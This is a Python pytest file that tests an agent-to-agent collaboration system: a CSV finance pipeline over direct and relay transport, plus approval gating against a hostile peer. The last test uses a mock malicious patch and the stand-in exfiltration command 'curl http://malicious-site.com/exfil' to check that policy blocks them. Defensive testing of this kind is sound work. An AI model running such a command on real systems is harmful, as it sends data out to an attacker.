"""Checkpoint M5 Smoke Tests: Two-profile finance-pipeline demonstration and hostile-peer gating (§15.8 M5 Phase 7)."""

from __future__ import annotations

import datetime
import json
from pathlib import Path
from unittest.mock import MagicMock

import httpx
import pytest
from cryptography.hazmat.primitives.asymmetric import ed25519

from kin.adapters import AdapterMessage, AdapterResponse
from kin.artifacts.preview import get_artifact_preview
from kin.artifacts.vault import (
    load_artifact_bytes,
    store_artifact,
)
from kin.artifacts.workspace import (
    WorkspaceWritePermissionDeniedError,
    import_artifact_to_workspace,
)
from kin.identity.keys import decrypt_from_sender
from kin.policy.evaluator import PolicyDecision
from kin.policy.persistence import (
    create_pending_approval,
    decide_approval,
    evaluate_action_for_session,
)
from kin.schemas import (
    ActionClass,
    AgentAutonomy,
    AgentAvailability,
    AgentBoundaries,
    AgentCapabilities,
    AgentCard,
    ApprovalRequest,
    AutonomyLevel,
    CapabilityAdvertisement,
    LocalCommandAdapterConfig,
    MessageKind,
    PublishedAgentCard,
    RiskLabel,
    SessionType,
)
from kin.session.orchestrator import advance_session_turn
from kin.storage.db import get_connection
from kin.storage.migrations import run_migrations
from kin.storage.vault import decrypt_field, encrypt_field
from kin.transport.v11 import (
    _iso_now,
    cache_peer_capabilities,
    cache_peer_card,
    dispatch_session,
    ingest_envelope,
    respond_to_session,
    send_artifact_offer,
)


def _gen_ed_keypair():
    priv = ed25519.Ed25519PrivateKey.generate()
    pub = priv.public_key()
    return priv, pub


def _gen_x25519_keypair():
    from cryptography.hazmat.primitives.asymmetric import x25519
    priv = x25519.X25519PrivateKey.generate()
    pub = priv.public_key()
    return priv.private_bytes_raw(), pub.public_bytes_raw()


def _setup_node(db_path: Path, username: str, agent_id: str, agent_name: str):
    conn = get_connection(db_path)
    run_migrations(conn)
    vault_key = b"01234567890123456789012345678901"

    ed_priv, ed_pub = _gen_ed_keypair()
    x255_priv, x255_pub = _gen_x25519_keypair()

    ed_pub_hex = ed_pub.public_bytes_raw().hex()
    conn.execute(
        "INSERT INTO identity (username, public_key, keychain_ref, protocol_version) VALUES (?, ?, 'keychain_ref', '1.1')",
        (username, ed_pub_hex),
    )

    card = AgentCard(
        schema_version="1.1",
        id=agent_id,
        name=agent_name,
        description=f"Agent for {username}",
        adapter=LocalCommandAdapterConfig(type="local_command", command="python", working_directory=str(db_path.parent)),
        capabilities=AgentCapabilities(tags=["test"], accepts=["text/csv"], produces=["text/csv"]),
        boundaries=AgentBoundaries(
            network_access="allow",
            filesystem="workspace_read_write_with_approval",
            shell="approval_required",
            max_runtime_seconds=300,
            max_artifact_bytes=10000000,
        ),
        autonomy=AgentAutonomy(
            relay_information=AutonomyLevel.ALWAYS_ALLOW,
            propose_actions=AutonomyLevel.ALWAYS_ALLOW,
            execute_local_actions=AutonomyLevel.ALWAYS_ALLOW,
        ),
    )
    card_json = json.dumps(card.model_dump(mode="json"))
    enc_card_json = encrypt_field(vault_key, card_json)
    conn.execute(
        """\
        INSERT INTO agents (agent_id, name, adapter_type, local_card_json, published_card_json, enabled, availability, created_at, updated_at)
        VALUES (?, ?, 'embedded', ?, ?, 1, 'ready', '2026-07-30T12:00:00Z', '2026-07-30T12:00:00Z')
        """,
        (agent_id, agent_name, enc_card_json, card_json),
    )
    conn.commit()

    return {
        "conn": conn,
        "vault_key": vault_key,
        "username": username,
        "agent_id": agent_id,
        "card": card,
        "ed_priv": ed_priv,
        "ed_pub": ed_pub,
        "x255_priv": x255_priv,
        "x255_pub": x255_pub,
    }


def _link_contacts(node_a, node_b, endpoint_b="http://bob-node"):
    node_a["conn"].execute(
        """\
        INSERT OR REPLACE INTO contacts (username, display_name, public_key, x25519_public_key, endpoint, autonomy_level, fingerprint_verified_at)
        VALUES (?, ?, ?, ?, ?, 'always_ask', '2026-07-30T12:00:00Z')
        """,
        (
            node_b["username"],
            node_b["username"].capitalize(),
            node_b["ed_pub"].public_bytes_raw().hex(),
            node_b["x255_pub"].hex(),
            endpoint_b,
        ),
    )
    node_b["conn"].execute(
        """\
        INSERT OR REPLACE INTO contacts (username, display_name, public_key, x25519_public_key, endpoint, autonomy_level, fingerprint_verified_at)
        VALUES (?, ?, ?, ?, ?, 'always_ask', '2026-07-30T12:00:00Z')
        """,
        (
            node_a["username"],
            node_a["username"].capitalize(),
            node_a["ed_pub"].public_bytes_raw().hex(),
            node_a["x255_pub"].hex(),
            "http://alice-node",
        ),
    )

    pub_card_b = PublishedAgentCard(
        schema_version="1.1",
        protocol_version="1.1",
        agent_id=node_b["agent_id"],
        name="Bob Agent",
        description="Bob Agent",
        capabilities=AgentCapabilities(tags=[], accepts=[], produces=[]),
        availability=AgentAvailability.READY,
        requires_owner_acceptance=True,
    )
    cache_peer_card(node_a["conn"], node_b["username"], pub_card_b)

    pub_card_a = PublishedAgentCard(
        schema_version="1.1",
        protocol_version="1.1",
        agent_id=node_a["agent_id"],
        name="Alice Agent",
        description="Alice Agent",
        capabilities=AgentCapabilities(tags=[], accepts=[], produces=[]),
        availability=AgentAvailability.READY,
        requires_owner_acceptance=True,
    )
    cache_peer_card(node_b["conn"], node_a["username"], pub_card_a)
    node_a["conn"].commit()
    node_b["conn"].commit()


@pytest.fixture
def finance_nodes(tmp_path):
    alice = _setup_node(tmp_path / "alice.db", "alice", "alice_agent", "Alice Agent")
    bob = _setup_node(tmp_path / "bob.db", "bob", "bob_agent", "Bob Agent")
    _link_contacts(alice, bob)
    return alice, bob


def test_finance_pipeline_smoke_direct_transport(finance_nodes, tmp_path, monkeypatch):
    """TEST 1 — Happy path, direct transport finance pipeline (§15.8 Checkpoint M5)."""
    alice, bob = finance_nodes
    workspace_dir = tmp_path / "alice_workspace"
    workspace_dir.mkdir()

    mock_client = MagicMock(spec=httpx.Client)
    mock_bob_client = MagicMock(spec=httpx.Client)

    def deliver_envelope(sender_node, receiver_node, env):
        def get_pubkey(un):
            return sender_node["ed_pub"] if un == sender_node["username"] else receiver_node["ed_pub"]

        cli = mock_bob_client if receiver_node["username"] == "alice" else mock_client
        ack = ingest_envelope(
            receiver_node["conn"],
            receiver_node["vault_key"],
            env,
            get_public_key_fn=get_pubkey,
            recipient_x25519_privkey=receiver_node["x255_priv"],
            owner_identity_key=receiver_node["ed_priv"],
            http_client=cli,
        )
        assert ack.status in ("delivered", "processed")
        return ack

    def mock_post(url, json=None, **kwargs):
        if "/v1.1/sessions" in url or "/v1.1/artifacts/offer" in url:
            actor = (json or {}).get("actor_username")
            sender = alice if actor == "alice" else bob
            receiver = bob if actor == "alice" else alice
            ack = deliver_envelope(sender, receiver, json)
            return MagicMock(status_code=200, json=lambda: ack.model_dump(mode="json"))
        raise httpx.RequestError(f"Unexpected endpoint: {url}")

    def mock_get(url, **kwargs):
        if "/v1.1/capabilities" in url:
            cap_ad = CapabilityAdvertisement(
                protocol_version="1.1",
                supported_features=["session_v1", "jcs_signatures"],
                max_turn_limit=12,
            )
            return MagicMock(status_code=200, json=lambda: cap_ad.model_dump(mode="json"))
        raise httpx.RequestError(f"Unexpected endpoint: {url}")

    mock_client.post.side_effect = mock_post
    mock_client.get.side_effect = mock_get
    mock_bob_client.post.side_effect = mock_post
    mock_bob_client.get.side_effect = mock_get

    # 1. Alice dispatches a build_pipeline session to Bob
    res_disp = dispatch_session(
        alice["conn"],
        alice["vault_key"],
        sender_identity_key=alice["ed_priv"],
        sender_x25519_privkey=alice["x255_priv"],
        sender_username="alice",
        peer_username="bob",
        sender_agent_id=alice["agent_id"],
        receiver_agent_id=bob["agent_id"],
        collaboration_mode=SessionType.BUILD_PIPELINE,
        goal="Transform Q3 finance CSV to EUR currency",
        peer_endpoint="http://bob-node",
        recipient_x25519_pubkey=bob["x255_pub"],
        http_client=mock_client,
    )
    session_id = res_disp["session_id"]
    assert res_disp["status"] == "delivered"

    # 2. Alice stores CSV artifact locally under this session_id
    raw_csv = b"account,amount\n1001,150.00\n1002,275.50\n"
    orig_meta = store_artifact(
        alice["conn"],
        alice["vault_key"],
        session_id=session_id,
        raw_bytes=raw_csv,
        mime_type="text/csv",
        offered_by="alice",
        preview_policy="auto",
        max_bytes=10000000,
    )
    orig_art_id = orig_meta.artifact_id

    # 3. Bob accepts the session

    res_accept = respond_to_session(
        bob["conn"],
        bob["vault_key"],
        bob["ed_priv"],
        bob["x255_priv"],
        owner_username="bob",
        session_id=session_id,
        decision="accept",
        accepting_agent_id=bob["agent_id"],
        peer_endpoint="http://alice-node",
        recipient_x25519_pubkey=alice["x255_pub"],
        http_client=mock_bob_client,
    )
    assert res_accept["status"] in ("delivered", "processed")

    # 4. Alice sends original CSV via send_artifact_offer
    res_offer = send_artifact_offer(
        alice["conn"],
        alice["vault_key"],
        alice["ed_priv"],
        alice["x255_priv"],
        owner_username="alice",
        session_id=session_id,
        artifact_id=orig_art_id,
        peer_endpoint="http://bob-node",
        recipient_x25519_pubkey=bob["x255_pub"],
        http_client=mock_client,
    )
    assert res_offer["status"] in ("offered", "delivered", "processed")

    # 5. Bob inspects the received CSV artifact preview
    bob_preview = get_artifact_preview(bob["conn"], bob["vault_key"], orig_art_id)
    assert bob_preview.preview_kind == "csv"
    assert "account,amount" in bob_preview.content

    # 6. Bob's session advances a turn; Bob's agent transforms the CSV
    transformed_csv_text = "account,amount_eur\n1001,138.00\n1002,253.46\n"
    captured_request = {}

    def mock_adapter_invoke(req, vault_key=None):
        captured_request["req"] = req
        t_meta = store_artifact(
            bob["conn"],
            bob["vault_key"],
            session_id=session_id,
            raw_bytes=transformed_csv_text.encode("utf-8"),
            mime_type="text/csv",
            offered_by="bob",
            preview_policy="auto",
            max_bytes=10000000,
            source="adapter_output",
        )
        captured_request["transformed_art_id"] = t_meta.artifact_id
        return AdapterResponse(
            terminal=True,
        )

    mock_bob_adapter = MagicMock()
    mock_bob_adapter.invoke.side_effect = mock_adapter_invoke
    monkeypatch.setattr("kin.session.orchestrator.get_adapter", lambda card: mock_bob_adapter)

    res_adv = advance_session_turn(
        bob["conn"],
        bob["vault_key"],
        bob["ed_priv"],
        "bob",
        session_id,
    )
    assert res_adv["status"] in ("advanced", "awaiting_owner_approval")

    # PROOF OF WIRING: Assert mock adapter was called with InputItem containing original CSV content!
    assert "req" in captured_request
    adapter_inputs = captured_request["req"].inputs
    assert len(adapter_inputs) >= 1
    orig_input = next(inp for inp in adapter_inputs if inp.ref == orig_art_id)
    assert orig_input.kind == "artifact"
    assert orig_input.content == raw_csv.decode("utf-8")

    transformed_art_id = captured_request["transformed_art_id"]

    # 7. Bob offers transformed CSV back to Alice
    res_offer_back = send_artifact_offer(
        bob["conn"],
        bob["vault_key"],
        bob["ed_priv"],
        bob["x255_priv"],
        owner_username="bob",
        session_id=session_id,
        artifact_id=transformed_art_id,
        peer_endpoint="http://alice-node",
        recipient_x25519_pubkey=alice["x255_pub"],
        http_client=mock_bob_client,
    )
    assert res_offer_back["status"] in ("offered", "delivered", "processed")

    # 8. Alice inspects transformed CSV preview
    alice_preview = get_artifact_preview(alice["conn"], alice["vault_key"], transformed_art_id)
    assert alice_preview.preview_kind == "csv"
    assert "account,amount_eur" in alice_preview.content

    # 9. Alice decides to import transformed CSV into workspace
    target_rel_path = "transformed_q3.csv"
    future_exp = _iso_now(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
    app_req1 = ApprovalRequest(
        schema_version="1.1",
        approval_id="app_test1_write",
        session_id=session_id,
        agent_id=alice["agent_id"],
        action_class=ActionClass.WORKSPACE_WRITE,
        summary="Import transformed CSV",
        reason="Import requested",
        risk_label=RiskLabel.MEDIUM,
        requested_scope={"relative_target_path": target_rel_path, "artifact_id": transformed_art_id},
        expires_at=future_exp,
    )
    appr_id = create_pending_approval(
        alice["conn"],
        alice["vault_key"],
        app_req1,
        agent_id=alice["agent_id"],
        action_class=ActionClass.WORKSPACE_WRITE,
        expires_at=future_exp,
    )

    decide_approval(
        alice["conn"],
        alice["vault_key"],
        approval_id=appr_id,
        session_id=session_id,
        decision="always_allow_bounded",
        owner_username="alice",
        now=_iso_now(),
    )

    imported_path = import_artifact_to_workspace(
        alice["conn"],
        alice["vault_key"],
        alice["card"],
        session_id=session_id,
        artifact_id=transformed_art_id,
        workspace_root=workspace_dir,
        relative_target_path=target_rel_path,
        now=_iso_now(),
    )

    assert imported_path.exists()
    assert imported_path.read_text(encoding="utf-8") == transformed_csv_text

    # 10. Owner-scoped authorization structural isolation check
    cur_alice = alice["conn"].cursor()
    cur_alice.execute("SELECT approval_id, decision FROM approvals")
    alice_approvals = cur_alice.fetchall()
    assert len(alice_approvals) >= 1
    assert alice_approvals[0][1] == "always_allow_bounded"

    cur_bob = bob["conn"].cursor()
    cur_bob.execute("SELECT approval_id FROM approvals")
    bob_approvals = cur_bob.fetchall()
    assert len(bob_approvals) == 0  # Bob's DB has 0 decisions made by Alice


def test_finance_pipeline_smoke_relay_transport(finance_nodes, tmp_path, monkeypatch):
    """TEST 2 — Same finance pipeline flow through relay transport (§15.8 Checkpoint M5)."""
    alice, bob = finance_nodes
    workspace_dir = tmp_path / "alice_relay_workspace"
    workspace_dir.mkdir()

    cap_ad = CapabilityAdvertisement(
        protocol_version="1.1",
        supported_features=["session_v1", "jcs_signatures"],
        max_turn_limit=12,
    )
    cache_peer_capabilities(alice["conn"], "bob", cap_ad)
    cache_peer_capabilities(bob["conn"], "alice", cap_ad)

    def mock_relay_post(url, **kwargs):
        if "/relay/mailbox" in url:
            body = kwargs.get("json", {})
            recipient = body.get("recipient_username") or body.get("to") or (url.split("/")[-1] if "/relay/mailbox/" in url else None)
            receiver = bob if recipient == "bob" else alice
            sender = alice if recipient == "bob" else bob

            def get_pubkey(un):
                return sender["ed_pub"] if un == sender["username"] else receiver["ed_pub"]

            blob_hex = body.get("payload") or body.get("encrypted_blob")
            payload_bytes = bytes.fromhex(blob_hex)
            raw_env_bytes = decrypt_from_sender(receiver["x255_priv"], sender["x255_pub"], payload_bytes)
            env_dict = json.loads(raw_env_bytes.decode("utf-8"))

            ack = ingest_envelope(
                receiver["conn"],
                receiver["vault_key"],
                env_dict,
                get_public_key_fn=get_pubkey,
                recipient_x25519_privkey=receiver["x255_priv"],
                owner_identity_key=receiver["ed_priv"],
                relay_url="http://relay.example.com",
                http_client=mock_client,
            )
            assert ack.status in ("delivered", "processed")
            return MagicMock(status_code=200, json=lambda: {"status": "queued"})
        raise httpx.RequestError(f"Connection refused to direct endpoint {url}")

    mock_client = MagicMock(spec=httpx.Client)
    mock_client.get.side_effect = httpx.RequestError("Unreachable direct capabilities")
    mock_client.post.side_effect = mock_relay_post

    # 1. Alice dispatches session via relay
    res_disp = dispatch_session(
        alice["conn"],
        alice["vault_key"],
        sender_identity_key=alice["ed_priv"],
        sender_x25519_privkey=alice["x255_priv"],
        sender_username="alice",
        peer_username="bob",
        sender_agent_id=alice["agent_id"],
        receiver_agent_id=bob["agent_id"],
        collaboration_mode=SessionType.BUILD_PIPELINE,
        goal="Relay transform CSV",
        peer_endpoint="http://unreachable-bob",
        relay_url="http://relay.example.com",
        recipient_x25519_pubkey=bob["x255_pub"],
        http_client=mock_client,
    )
    session_id = res_disp["session_id"]
    assert res_disp["status"] == "queued"

    # 2. Alice stores CSV artifact under session_id
    raw_csv = b"account,amount\n2001,500.00\n2002,750.00\n"
    orig_meta = store_artifact(
        alice["conn"],
        alice["vault_key"],
        session_id=session_id,
        raw_bytes=raw_csv,
        mime_type="text/csv",
        offered_by="alice",
        preview_policy="auto",
        max_bytes=10000000,
    )
    orig_art_id = orig_meta.artifact_id

    # 3. Bob accepts session via relay
    res_accept = respond_to_session(
        bob["conn"],
        bob["vault_key"],
        bob["ed_priv"],
        bob["x255_priv"],
        owner_username="bob",
        session_id=session_id,
        decision="accept",
        accepting_agent_id=bob["agent_id"],
        peer_endpoint="http://unreachable-alice",
        relay_url="http://relay.example.com",
        recipient_x25519_pubkey=alice["x255_pub"],
        http_client=mock_client,
    )
    assert res_accept["status"] in ("queued", "processed")

    # 4. Alice offers CSV via relay
    res_offer = send_artifact_offer(
        alice["conn"],
        alice["vault_key"],
        alice["ed_priv"],
        alice["x255_priv"],
        owner_username="alice",
        session_id=session_id,
        artifact_id=orig_art_id,
        peer_endpoint="http://unreachable-bob",
        relay_url="http://relay.example.com",
        recipient_x25519_pubkey=bob["x255_pub"],
        http_client=mock_client,
    )
    assert res_offer["status"] in ("queued", "offered", "processed")

    # 5. Bob advances turn; agent generates transformed CSV
    transformed_csv_text = "account,amount_eur\n2001,460.00\n2002,690.00\n"

    def mock_adapter_invoke(req, vault_key=None):
        t_meta = store_artifact(
            bob["conn"],
            bob["vault_key"],
            session_id=session_id,
            raw_bytes=transformed_csv_text.encode("utf-8"),
            mime_type="text/csv",
            offered_by="bob",
            preview_policy="auto",
            max_bytes=10000000,
            source="adapter_output",
        )
        return AdapterResponse(
            terminal=True,
        )

    mock_bob_adapter = MagicMock()
    mock_bob_adapter.invoke.side_effect = mock_adapter_invoke
    monkeypatch.setattr("kin.session.orchestrator.get_adapter", lambda card: mock_bob_adapter)

    res_adv = advance_session_turn(
        bob["conn"],
        bob["vault_key"],
        bob["ed_priv"],
        "bob",
        session_id,
    )
    assert res_adv["status"] in ("advanced", "awaiting_owner_approval")

    cur_bob = bob["conn"].cursor()
    cur_bob.execute("SELECT artifact_id FROM artifacts WHERE offered_by = 'bob'")
    t_art_id = cur_bob.fetchone()[0]

    # 6. Bob offers transformed CSV back to Alice via relay
    res_offer_back = send_artifact_offer(
        bob["conn"],
        bob["vault_key"],
        bob["ed_priv"],
        bob["x255_priv"],
        owner_username="bob",
        session_id=session_id,
        artifact_id=t_art_id,
        peer_endpoint="http://unreachable-alice",
        relay_url="http://relay.example.com",
        recipient_x25519_pubkey=alice["x255_pub"],
        http_client=mock_client,
    )
    assert res_offer_back["status"] in ("queued", "offered", "processed")

    # 7. Alice approves and imports to workspace
    target_rel_path = "relay_transformed.csv"
    future_exp2 = _iso_now(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
    app_req2 = ApprovalRequest(
        schema_version="1.1",
        approval_id="app_test2_write",
        session_id=session_id,
        agent_id=alice["agent_id"],
        action_class=ActionClass.WORKSPACE_WRITE,
        summary="Import transformed CSV via relay",
        reason="Import requested",
        risk_label=RiskLabel.MEDIUM,
        requested_scope={"relative_target_path": target_rel_path, "artifact_id": t_art_id},
        expires_at=future_exp2,
    )
    appr_id = create_pending_approval(
        alice["conn"],
        alice["vault_key"],
        app_req2,
        agent_id=alice["agent_id"],
        action_class=ActionClass.WORKSPACE_WRITE,
        expires_at=future_exp2,
    )
    decide_approval(
        alice["conn"],
        alice["vault_key"],
        approval_id=appr_id,
        session_id=session_id,
        decision="approve_once",
        owner_username="alice",
        now=_iso_now(),
    )

    imported_path = import_artifact_to_workspace(
        alice["conn"],
        alice["vault_key"],
        alice["card"],
        session_id=session_id,
        artifact_id=t_art_id,
        workspace_root=workspace_dir,
        relative_target_path=target_rel_path,
        now=_iso_now(),
    )

    assert imported_path.exists()
    assert imported_path.read_text(encoding="utf-8") == transformed_csv_text


def test_hostile_peer_patch_and_shell_blocked_without_approval(finance_nodes, tmp_path):
    """TEST 3 — Hostile peer action (patch/shell) provably blocked without local owner approval (§15.8 Checkpoint M5)."""
    alice, bob = finance_nodes
    workspace_dir = tmp_path / "alice_secure_workspace"
    workspace_dir.mkdir()

    target_file = workspace_dir / "config.json"
    target_file.write_text('{"debug": false}\n', encoding="utf-8")

    # Session setup between Alice and Bob
    session_id = "sess_hostile_test"
    alice["conn"].execute(
        """\
        INSERT INTO sessions (
            session_id, type, initiator_username, receiver_username, status,
            objective, sender_agent_id, receiver_agent_id, turn_limit,
            created_at, updated_at
        ) VALUES (?, 'ask', 'bob', 'alice', 'active', 'Hostile session', 'bob_agent', 'alice_agent', 12, '2026-07-30T12:00:00Z', '2026-07-30T12:00:00Z')
        """,
        (session_id,),
    )
    alice["conn"].commit()

    # 1. Bob (adversary) offers a hostile patch artifact targeting Alice's config.json
    patch_bytes = (
        b"--- config.json\n"
        b"+++ config.json\n"
        b"@@ -1,1 +1,1 @@\n"
        b"-{\"debug\": false}\n"
        b"+{\"debug\": true, \"pwned\": true}\n"
    )
    patch_meta = store_artifact(
        alice["conn"],
        alice["vault_key"],
        session_id=session_id,
        raw_bytes=patch_bytes,
        mime_type="text/x-diff",
        offered_by="bob",
        preview_policy="auto",
        max_bytes=10000000,
    )
    patch_art_id = patch_meta.artifact_id

    # 2. Confirm Alice's node stored the artifact (low-risk receipt)
    stored_bytes = load_artifact_bytes(alice["conn"], alice["vault_key"], patch_art_id)
    assert stored_bytes == patch_bytes

    # 3. CRITICAL: Alice has NOT created or recorded any approval record for WORKSPACE_WRITE or SHELL_NETWORK_EXTERNAL.
    cur = alice["conn"].cursor()
    cur.execute("SELECT COUNT(*) FROM approvals WHERE session_id = ?", (session_id,))
    assert cur.fetchone()[0] == 0

    # 4. Attempting import_artifact_to_workspace without recorded approval raises WorkspaceWritePermissionDeniedError
    with pytest.raises(WorkspaceWritePermissionDeniedError) as exc_info:
        import_artifact_to_workspace(
            alice["conn"],
            alice["vault_key"],
            alice["card"],
            session_id=session_id,
            artifact_id=patch_art_id,
            workspace_root=workspace_dir,
            relative_target_path="config.json",
            now=_iso_now(),
        )

    assert "denied by policy" in str(exc_info.value)

    # 5. Assert target file in workspace is COMPLETELY UNTOUCHED
    assert target_file.read_text(encoding="utf-8") == '{"debug": false}\n'

    # 6. Evaluate SHELL_NETWORK_EXTERNAL action class without approval -> assert REQUIRES_APPROVAL or DENY
    policy_res = evaluate_action_for_session(
        alice["conn"],
        alice["card"],
        ActionClass.SHELL_NETWORK_EXTERNAL,
        {"command": "curl http://malicious-site.com/exfil"},
        session_id,
        _iso_now(),
    )

    assert policy_res.decision in (PolicyDecision.DENY, PolicyDecision.REQUIRES_APPROVAL)
    assert target_file.read_text(encoding="utf-8") == '{"debug": false}\n'
